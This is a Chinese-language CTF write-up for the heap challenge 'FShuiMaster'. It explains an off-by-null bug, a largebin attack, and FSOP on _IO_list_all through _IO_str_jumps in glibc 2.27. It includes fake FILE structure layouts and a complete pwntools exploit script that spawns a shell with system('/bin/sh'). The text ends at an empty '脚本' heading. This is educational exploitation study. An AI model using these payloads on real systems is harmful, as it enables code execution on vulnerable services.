<h2 id="FShuiMaster"><a href="#FShuiMaster" class="headerlink" title="FShuiMaster"></a>FShuiMaster</h2><p>存在off by null漏洞，但只能申请largebin的堆块，所以可以进行larginbinattack，然后largebin上申请到的堆块可以泄露libc地址，在堆上布置然后打io_list_all就行了，重点讲一下io_list_all，我的主要学习来源是ctfwiki，对io_list_all的攻击也叫作FSOP.</p>
<p>在讲解FSOP前先讲一讲io_file结构，之前在stdout泄露libc基地址的时候讲过，但不是很深入，这里再梳理一次</p>
<p>io_file是一组织io操作的文件结构体，当打开有io操作的设备时就会生成对应的io_file结构体,比如stdout,stdin,stderr，io_file代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>file主要是对设备io操作的一些信息，vtable是一个虚表，里面记录了很多的函数地址，在io操作的时候会拿vtable里的地址跳转执行，据ctfwiki所说，在libc2.23的情况的下可以直接修改io_file_plus的vtable地址，可以伪造一个vtable然后修改io_file_plus的vtable地址指向我们的伪造的vtable(任意地址写)，然后对vtable的使用情况填上ogg或者system_addr,这种方法只适合在Libc2.23使用（在libc2.23下vtable表是不可以写入的，所以不能修改vtable里的内容）。</p>
<p>注意io_file file并不是一个指针而是给他实际分配了空间io_file_plus的完全体实际上是这样的,其中vtable相对于io_file_plus的偏移是0xd8。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">file</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>程序打开了很多设备代表着有很多的io_file_plus结构体，这些结构体以链表进行组织，其中next域是file的_chain，这个链表是单链表，链表头记录在io_list_all中，其中一般的链表头的io_file_plus是stderr</p>
<p>上面说了libc2.24以后不能伪造vtable了，主要是因为当使用vtable的时候就会对vtable进行范围检查，vtable得在这个范围内，虽说限制了vtable，但也存在漏洞，这个范围内也有很多我们可以利用的虚表，比如io_str_jumps或io_wfile_jumps他们里面也全部记录着函数指针，我们可以把vtable指向这两个地方比如io_str_jumps</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中_IO_str_overflow和IO_str_finish是我们主要利用的函数指针，_IO_str_overflow和IO_str_finish都存在相对地址调用，如_IO_str_overflow</p>
<h4 id="IO-str-overflow"><a href="#IO-str-overflow" class="headerlink" title="_IO_str_overflow"></a>_IO_str_overflow</h4><p><code>new_buf= (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code>最后会调用fp+0xe0,然后参数是new_size,这个也是通过fp的内容计算出来的,下面是poc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> +<span class="number">1</span></span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">_freeres_list = <span class="number">0x2</span></span><br><span class="line">_freeres_buf = <span class="number">0x3</span></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">vtable = _IO_str_jumps</span><br><span class="line">fp+<span class="number">0xe0</span>=system</span><br></pre></td></tr></table></figure>

<p>题目构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(<span class="number">0</span>)</span><br><span class="line">pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">pay+= p64(<span class="number">2</span>)</span><br><span class="line">pay+= p64(<span class="number">3</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)</span><br><span class="line">pay+= p64(<span class="number">0xffffffff</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(libc.address+<span class="number">0x3e8360</span>)</span><br><span class="line">pay+= p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>只要fp这样构造然后调用_IO_str_overflow的时候最后就会执行system(‘/bin/sh’),现在问题是如何伪造io_file_plus以及如何执行_IO_str_overflow</p>
<p>上面提到过的，io_file_plus的头结点储存在io_list_all里面，所以可以覆盖io_list_all为我们可以控制的一段内存，比如堆，也就是说我们伪造了stferr的io_file_plus，然后在这段内存中构造上面的内容就好了。</p>
<p>函数IO_flush_all_lockp 会刷新所有文件流，内部会调用vtable+0x10的函数，当把vtable覆盖成io_str_jumps后vtable+0x10就是_IO_str_overflow函数地址，所以只要调用io_flush_all_lockp就好了，在程序main函数返回或者执行exit(0)或者执行abort时会调用io_flush_all_lockp函数，所以在fake_io_file_plus后触发io_flush_all_lockp就好了。</p>
<p>这是_IO_str_overflow的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#sh= process([&quot;./ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please Write U Name on the Book\n\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Number of words?&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input U character&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input the page U want 2 change&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now Change U this page : &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input the page U want 2 tear off&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;tear_off Finished\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input The page U want 2 scan&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0x8a0</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc.address=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5 -&gt;1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x448</span>,flat(&#123;<span class="number">0x440</span>:<span class="string">&quot;\x01&quot;</span>&#125;))<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#12</span></span><br><span class="line">    show(<span class="number">12</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ce0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#13</span></span><br><span class="line">    <span class="comment"># free(1)</span></span><br><span class="line">    <span class="comment"># io_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#14</span></span><br><span class="line">    <span class="comment"># edit(5,p64(0)+p64(io_list_all-0x10)+&#x27;\n&#x27;)</span></span><br><span class="line">    <span class="comment"># free(13)</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#15</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    edit(<span class="number">15</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0x8b0</span>))</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#18</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#19-&gt;15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#20</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#21</span></span><br><span class="line">    io_list_all=libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#22</span></span><br><span class="line">    <span class="comment"># payload=&#x27;\x00&#x27;*0x10+p64(0)+p64(1)</span></span><br><span class="line">    <span class="comment"># payload+=p64(2)+p64(binsh_addr)</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(0xa8-0x10,&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># payload+=p64(2)+p64(3)+p64(0)+p64(0)</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(0xc8,&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># payload+=p64(libc_base+0x3e8360-0x8)+p64(0)</span></span><br><span class="line">    <span class="comment"># payload+=p64(libc_base+libc.sym[&#x27;system&#x27;])</span></span><br><span class="line">    pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">    pay+= p64(<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">3</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64(<span class="number">0xffffffff</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(libc.address+<span class="number">0x3e8360</span>)</span><br><span class="line">    pay+= p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    edit(<span class="number">19</span>,pay+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h4 id="io-str-finish"><a href="#io-str-finish" class="headerlink" title="io_str_finish"></a>io_str_finish</h4><p>除了io_str_overflow以外io_str_finish这个函数指针也可以使用，也是通过io_flush_all_lockp函数这个函数调用的，只要让vtable=io_str_jumps-,这个函数调用的是fp+0xe8,在对应位置填上system_addr就行。然后fp的伪造也比io_str_overflow简单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = <span class="number">0xffffffff</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base = bin_sh_addr （也就是 fp-&gt;_IO_write_end）</span><br><span class="line">fp-&gt;_flags2 = <span class="number">0</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">2</span>)+p64(binsh_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa8</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>脚本</p>
